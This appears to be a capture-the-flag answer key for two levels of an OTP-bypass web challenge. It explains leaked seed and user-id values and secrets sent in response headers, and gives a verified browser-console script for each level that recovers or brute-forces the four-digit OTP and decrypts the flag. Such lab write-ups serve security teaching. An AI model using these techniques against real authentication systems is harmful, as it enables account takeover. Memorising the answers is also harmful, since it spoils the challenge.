L1 — Predictable from seed+uidNo plaintext OTP — the OTP token's id leaks as _seed and the user id as _uid; the OTP is parseInt(sha256(seed·uid)[:8], 16) % 10000 (first 8 hex of the hash as an integer, last 4 digits; inputs concatenated as decimal strings). In CTF the _algo field states this.Recompute the OTP from _seed+_uid (concatenate as strings, not numbers), then decrypt the sealed flag (_flag_enc = flag XOR sha256(OTP)).
Console exploit
(async () => {
  const js = await (await fetch('/public/js/otp-validation.js')).text();
  const d = JSON.parse(js.match(/SESSION_INJECT_START\*\/\s*(\{.*?\})\s*\/\*SESSION_INJECT_END/s)[1]);
  const msg = String(d._seed) + String(d._uid); // string concat (NOT numeric addition)
  const hex = [...new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(msg)))].map(b => b.toString(16).padStart(2, '0')).join('');
  const otp = String(parseInt(hex.slice(0, 8), 16) % 10000).padStart(4, '0'); // first 8 hex -> int -> last 4 digits
  const key = new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(otp)));
  const ct = Uint8Array.from(atob(d._flag_enc), c => c.charCodeAt(0));
  console.log('OTP =', otp, '  Flag =', String.fromCharCode(...ct.map((b, i) => b ^ key[i % 32])));
})();
✓ verified
L2 — Secrets in response headersNothing sensitive in the JS body — the OTP hash (X-Otp-Check = sha256(otp)) and the sealed flag (X-Flag-Enc) ship in the response headers of otp-validation.js. The body carries only breadcrumbs (_algo/_flag_algo) pointing at the headers.Read the response headers (Network tab) → brute-force the 10,000-value space against X-Otp-Check, then decrypt the sealed X-Flag-Enc with the recovered OTP.
Console exploit
(async () => {
  const res = await fetch('/public/js/otp-validation.js');
  const otpCheck = res.headers.get('X-Otp-Check');   // sha256(otp), from the response header
  const flagEnc  = res.headers.get('X-Flag-Enc');    // sealed flag, from the response header
  const enc = new TextEncoder();
  let otp;
  for (let i = 0; i < 10000; i++) {
    const g = String(i).padStart(4, '0');
    const h = [...new Uint8Array(await crypto.subtle.digest('SHA-256', enc.encode(g)))].map(x => x.toString(16).padStart(2, '0')).join('');
    if (h === otpCheck) { otp = g; break; }
  }
  const key = new Uint8Array(await crypto.subtle.digest('SHA-256', enc.encode(otp)));
  const ct = Uint8Array.from(atob(flagEnc), c => c.charCodeAt(0));
  console.log('OTP =', otp, '  Flag =', String.fromCharCode(...ct.map((b, i) => b ^ key[i])));
})();
✓ verified
